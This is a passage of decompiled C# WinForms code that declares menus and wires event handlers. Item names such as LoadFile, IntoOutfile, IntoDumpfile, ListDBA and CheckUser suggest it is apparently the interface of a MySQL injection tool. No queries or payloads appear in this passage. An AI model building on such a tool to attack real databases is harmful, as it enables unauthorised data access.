	internal virtual ToolStripMenuItem mnuSchema7
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("mnuSchema8")]
	internal virtual ToolStripMenuItem mnuSchema8
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("mnuSchema9")]
	internal virtual ToolStripMenuItem mnuSchema9
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual BackgroundWorker bckAlexa
	{
		[CompilerGenerated]
		get
		{
			return backgroundWorker_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DoWorkEventHandler value2 = method_138;
			RunWorkerCompletedEventHandler value3 = method_139;
			BackgroundWorker backgroundWorker = backgroundWorker_1;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork -= value2;
				backgroundWorker.RunWorkerCompleted -= value3;
			}
			backgroundWorker_1 = value;
			backgroundWorker = backgroundWorker_1;
			if (backgroundWorker != null)
			{
				backgroundWorker.DoWork += value2;
				backgroundWorker.RunWorkerCompleted += value3;
			}
		}
	}

	[field: AccessedThroughProperty("ctmTemplatesMySQL")]
	internal virtual ContextMenuStrip ctmTemplatesMySQL
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem mnuUsers
	{
		[CompilerGenerated]
		get
		{
			return _mnuUsers;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_112;
			ToolStripMenuItem toolStripMenuItem = _mnuUsers;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuUsers = value;
			toolStripMenuItem = _mnuUsers;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuPrivileges
	{
		[CompilerGenerated]
		get
		{
			return _mnuPrivileges;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_111;
			ToolStripMenuItem toolStripMenuItem = _mnuPrivileges;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuPrivileges = value;
			toolStripMenuItem = _mnuPrivileges;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuListDBA
	{
		[CompilerGenerated]
		get
		{
			return _mnuListDBA;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_105;
			ToolStripMenuItem toolStripMenuItem = _mnuListDBA;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuListDBA = value;
			toolStripMenuItem = _mnuListDBA;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuHostIP
	{
		[CompilerGenerated]
		get
		{
			return _mnuHostIP;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_104;
			ToolStripMenuItem toolStripMenuItem = _mnuHostIP;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuHostIP = value;
			toolStripMenuItem = _mnuHostIP;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuExtraMySQLStuffs2
	{
		[CompilerGenerated]
		get
		{
			return _mnuExtraMySQLStuffs2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_107;
			ToolStripMenuItem toolStripMenuItem = _mnuExtraMySQLStuffs2;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuExtraMySQLStuffs2 = value;
			toolStripMenuItem = _mnuExtraMySQLStuffs2;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuLoadFile
	{
		[CompilerGenerated]
		get
		{
			return _mnuLoadFile;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_108;
			ToolStripMenuItem toolStripMenuItem = _mnuLoadFile;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuLoadFile = value;
			toolStripMenuItem = _mnuLoadFile;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuIntoOutfile
	{
		[CompilerGenerated]
		get
		{
			return _mnuIntoOutfile;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_109;
			ToolStripMenuItem toolStripMenuItem = _mnuIntoOutfile;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuIntoOutfile = value;
			toolStripMenuItem = _mnuIntoOutfile;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuIntoDumpfile
	{
		[CompilerGenerated]
		get
		{
			return _mnuIntoDumpfile;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_110;
			ToolStripMenuItem toolStripMenuItem = _mnuIntoDumpfile;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuIntoDumpfile = value;
			toolStripMenuItem = _mnuIntoDumpfile;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuExtraMySQLStuffs
	{
		[CompilerGenerated]
		get
		{
			return _mnuExtraMySQLStuffs;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_106;
			ToolStripMenuItem toolStripMenuItem = _mnuExtraMySQLStuffs;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuExtraMySQLStuffs = value;
			toolStripMenuItem = _mnuExtraMySQLStuffs;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuCheckUser
	{
		[CompilerGenerated]
		get
		{
			return _mnuCheckUser;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_113;
			ToolStripMenuItem toolStripMenuItem = _mnuCheckUser;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuCheckUser = value;
			toolStripMenuItem = _mnuCheckUser;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuCheckPizza
	{
		[CompilerGenerated]
		get
		{
			return _mnuCheckPizza;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_114;
			ToolStripMenuItem toolStripMenuItem = _mnuCheckPizza;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuCheckPizza = value;
			toolStripMenuItem = _mnuCheckPizza;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuJOIN
	{
		[CompilerGenerated]
		get
		{
			return _mnuJOIN;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_115;
			ToolStripMenuItem toolStripMenuItem = _mnuJOIN;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuJOIN = value;
			toolStripMenuItem = _mnuJOIN;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuLENGTH
	{
		[CompilerGenerated]
		get
		{
			return _mnuLENGTH;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_116;
			ToolStripMenuItem toolStripMenuItem = _mnuLENGTH;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuLENGTH = value;
			toolStripMenuItem = _mnuLENGTH;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuLimitXY
	{
		[CompilerGenerated]
		get
		{
			return _mnuLimitXY;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_117;
			ToolStripMenuItem toolStripMenuItem = _mnuLimitXY;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuLimitXY = value;
			toolStripMenuItem = _mnuLimitXY;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripSeparator34")]
	internal virtual ToolStripSeparator ToolStripSeparator34
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem mnuMySQLHelp
	{
		[CompilerGenerated]
		get
		{
			return _mnuMySQLHelp;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_130;
			ToolStripMenuItem toolStripMenuItem = _mnuMySQLHelp;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuMySQLHelp = value;
			toolStripMenuItem = _mnuMySQLHelp;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ContextMenuStrip ctmConvert
	{
		[CompilerGenerated]
		get
		{
			return _mnuListView_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			CancelEventHandler value2 = method_122;
			ContextMenuStrip mnuListView_ = _mnuListView_1;
			if (mnuListView_ != null)
			{
				mnuListView_.Opening -= value2;
			}
			_mnuListView_1 = value;
			mnuListView_ = _mnuListView_1;
			if (mnuListView_ != null)
			{
				mnuListView_.Opening += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuConvHex
	{
		[CompilerGenerated]
		get
		{
			return _mnuConvHex;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_124;
			ToolStripMenuItem toolStripMenuItem = _mnuConvHex;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuConvHex = value;
			toolStripMenuItem = _mnuConvHex;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuConvChar
	{
		[CompilerGenerated]
		get
		{
			return _mnuConvChar;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_124;
			ToolStripMenuItem toolStripMenuItem = _mnuConvChar;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuConvChar = value;
			toolStripMenuItem = _mnuConvChar;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuConvCharGroup
	{
		[CompilerGenerated]
		get
		{
			return _mnuConvCharGroup;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_124;
			ToolStripMenuItem toolStripMenuItem = _mnuConvCharGroup;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuConvCharGroup = value;
			toolStripMenuItem = _mnuConvCharGroup;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("ToolStripMenuItem2")]
	internal virtual ToolStripSeparator ToolStripMenuItem2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem mnuConvLEN
	{
		[CompilerGenerated]
		get
		{
			return _mnuConvLEN;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_124;
			ToolStripMenuItem toolStripMenuItem = _mnuConvLEN;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuConvLEN = value;
			toolStripMenuItem = _mnuConvLEN;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuConvAddA
	{
		[CompilerGenerated]
		get
		{
			return _mnuConvAddA;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_123;
			ToolStripMenuItem toolStripMenuItem = _mnuConvAddA;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuConvAddA = value;
			toolStripMenuItem = _mnuConvAddA;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ImageList imgTV
	{
		[CompilerGenerated]
		get
		{
			return imageList_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			imageList_0 = value;
		}
	}

	internal virtual ContextMenuStrip mnuTree
	{
		[CompilerGenerated]
		get
		{
			return _mnuListView;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			CancelEventHandler value2 = method_61;
			ContextMenuStrip mnuListView = _mnuListView;
			if (mnuListView != null)
			{
				mnuListView.Opening -= value2;
			}
			_mnuListView = value;
			mnuListView = _mnuListView;
			if (mnuListView != null)
			{
				mnuListView.Opening += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuCountDBs
	{
		[CompilerGenerated]
		get
		{
			return _mnuCountDBs;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_60;
			ToolStripMenuItem toolStripMenuItem = _mnuCountDBs;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuCountDBs = value;
			toolStripMenuItem = _mnuCountDBs;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuCountTables
	{
		[CompilerGenerated]
		get
		{
			return _mnuCountTables;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_60;
			ToolStripMenuItem toolStripMenuItem = _mnuCountTables;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuCountTables = value;
			toolStripMenuItem = _mnuCountTables;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuCountTablesAll
	{
		[CompilerGenerated]
		get
		{
			return _mnuCountTablesAll;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_60;
			ToolStripMenuItem toolStripMenuItem = _mnuCountTablesAll;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuCountTablesAll = value;
			toolStripMenuItem = _mnuCountTablesAll;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuCountColumns
	{
		[CompilerGenerated]
		get
		{
			return _mnuCountColumns;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_60;
			ToolStripMenuItem toolStripMenuItem = _mnuCountColumns;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuCountColumns = value;
			toolStripMenuItem = _mnuCountColumns;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuCountColumnsAll
	{
		[CompilerGenerated]
		get
		{
			return _mnuCountColumnsAll;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_60;
			ToolStripMenuItem toolStripMenuItem = _mnuCountColumnsAll;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuCountColumnsAll = value;
			toolStripMenuItem = _mnuCountColumnsAll;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuCountRows
	{
		[CompilerGenerated]
		get
		{
			return _mnuCountRows;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_60;
			ToolStripMenuItem toolStripMenuItem = _mnuCountRows;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuCountRows = value;
			toolStripMenuItem = _mnuCountRows;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuCountRowsAll
	{
		[CompilerGenerated]
		get
		{
			return _mnuCountRowsAll;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_60;
			ToolStripMenuItem toolStripMenuItem = _mnuCountRowsAll;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuCountRowsAll = value;
			toolStripMenuItem = _mnuCountRowsAll;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("mnuCountSP")]
	internal virtual ToolStripSeparator mnuCountSP
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem mnuCopyDB
	{
		[CompilerGenerated]
		get
		{
			return _mnuCopyDB;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_63;
			ToolStripMenuItem toolStripMenuItem = _mnuCopyDB;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuCopyDB = value;
			toolStripMenuItem = _mnuCopyDB;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuCopyColumn
	{
		[CompilerGenerated]
		get
		{
			return _mnuCopyColumn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_63;
			ToolStripMenuItem toolStripMenuItem = _mnuCopyColumn;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuCopyColumn = value;
			toolStripMenuItem = _mnuCopyColumn;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuCopyTable
	{
		[CompilerGenerated]
		get
		{
			return _mnuCopyTable;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_63;
			ToolStripMenuItem toolStripMenuItem = _mnuCopyTable;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuCopyTable = value;
			toolStripMenuItem = _mnuCopyTable;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("mnuCheckAllSP")]
	internal virtual ToolStripSeparator mnuCheckAllSP
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem mnuCheckAllColumns
	{
		[CompilerGenerated]
		get
		{
			return _mnuCheckAllColumns;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_62;
			ToolStripMenuItem toolStripMenuItem = _mnuCheckAllColumns;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuCheckAllColumns = value;
			toolStripMenuItem = _mnuCheckAllColumns;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuUnCheckAllColumns
	{
		[CompilerGenerated]
		get
		{
			return _mnuUnCheckAllColumns;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_62;
			ToolStripMenuItem toolStripMenuItem = _mnuUnCheckAllColumns;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuUnCheckAllColumns = value;
			toolStripMenuItem = _mnuUnCheckAllColumns;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuCheckRevert
	{
		[CompilerGenerated]
		get
		{
			return _mnuCheckRevert;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_62;
			ToolStripMenuItem toolStripMenuItem = _mnuCheckRevert;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuCheckRevert = value;
			toolStripMenuItem = _mnuCheckRevert;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("mnuTreeSP1")]
	internal virtual ToolStripSeparator mnuTreeSP1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem mnuCopyAllNodes
	{
		[CompilerGenerated]
		get
		{
			return _mnuCopyAllNodes;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_64;
			ToolStripMenuItem toolStripMenuItem = _mnuCopyAllNodes;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuCopyAllNodes = value;
			toolStripMenuItem = _mnuCopyAllNodes;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuCopyAllSchema
	{
		[CompilerGenerated]
		get
		{
			return _mnuCopyAllSchema;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_65;
			ToolStripMenuItem toolStripMenuItem = _mnuCopyAllSchema;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuCopyAllSchema = value;
			toolStripMenuItem = _mnuCopyAllSchema;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("mnuTreeSP2")]
	internal virtual ToolStripSeparator mnuTreeSP2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem mnuClearNodes
	{
		[CompilerGenerated]
		get
		{
			return _mnuClearNodes;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_66;
			ToolStripMenuItem toolStripMenuItem = _mnuClearNodes;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuClearNodes = value;
			toolStripMenuItem = _mnuClearNodes;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuClearSchema
	{
		[CompilerGenerated]
		get
		{
			return _mnuClearSchema;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_67;
			ToolStripMenuItem toolStripMenuItem = _mnuClearSchema;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuClearSchema = value;
			toolStripMenuItem = _mnuClearSchema;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("mnuTreeSP3")]
	internal virtual ToolStripSeparator mnuTreeSP3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem mnuRemDB
	{
		[CompilerGenerated]
		get
		{
			return _mnuRemDB;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_68;
			ToolStripMenuItem toolStripMenuItem = _mnuRemDB;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuRemDB = value;
			toolStripMenuItem = _mnuRemDB;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuRemTable
	{
		[CompilerGenerated]
		get
		{
			return _mnuRemTable;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_68;
			ToolStripMenuItem toolStripMenuItem = _mnuRemTable;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuRemTable = value;
			toolStripMenuItem = _mnuRemTable;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuRemColumn
	{
		[CompilerGenerated]
		get
		{
			return _mnuRemColumn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_68;
			ToolStripMenuItem toolStripMenuItem = _mnuRemColumn;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuRemColumn = value;
			toolStripMenuItem = _mnuRemColumn;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("mnuTreeSP5")]
	internal virtual ToolStripSeparator mnuTreeSP5
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem mnuAddDB
	{
		[CompilerGenerated]
		get
		{
			return _mnuAddDB;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_69;
			ToolStripMenuItem toolStripMenuItem = _mnuAddDB;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuAddDB = value;
			toolStripMenuItem = _mnuAddDB;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuAddTable
	{
		[CompilerGenerated]
		get
		{
			return _mnuAddTable;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_69;
			ToolStripMenuItem toolStripMenuItem = _mnuAddTable;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuAddTable = value;
			toolStripMenuItem = _mnuAddTable;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuAddColumn
	{
		[CompilerGenerated]
		get
		{
			return _mnuAddColumn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_69;
			ToolStripMenuItem toolStripMenuItem = _mnuAddColumn;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuAddColumn = value;
			toolStripMenuItem = _mnuAddColumn;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("mnuTreeSP4")]
	internal virtual ToolStripSeparator mnuTreeSP4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual ToolStripMenuItem mnuCollapseTree
	{
		[CompilerGenerated]
		get
		{
			return _mnuCollapseTree;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_70;
			ToolStripMenuItem toolStripMenuItem = _mnuCollapseTree;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuCollapseTree = value;
			toolStripMenuItem = _mnuCollapseTree;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	internal virtual ToolStripMenuItem mnuSortTree
	{
		[CompilerGenerated]
		get
		{
			return _mnuSortTree;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = method_71;
			ToolStripMenuItem toolStripMenuItem = _mnuSortTree;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click -= value2;
			}
			_mnuSortTree = value;
			toolStripMenuItem = _mnuSortTree;
			if (toolStripMenuItem != null)
			{
				toolStripMenuItem.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("lblVersion")]
	internal virtual ToolStripLabel lblVersion
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("chkAllInOneRequest")]
	internal virtual CheckBox chkAllInOneRequest
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("chkClearListOnGet")]
	internal virtual CheckBox chkClearListOnGet
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("splWhere")]
	internal virtual SplitContainer splWhere
	{
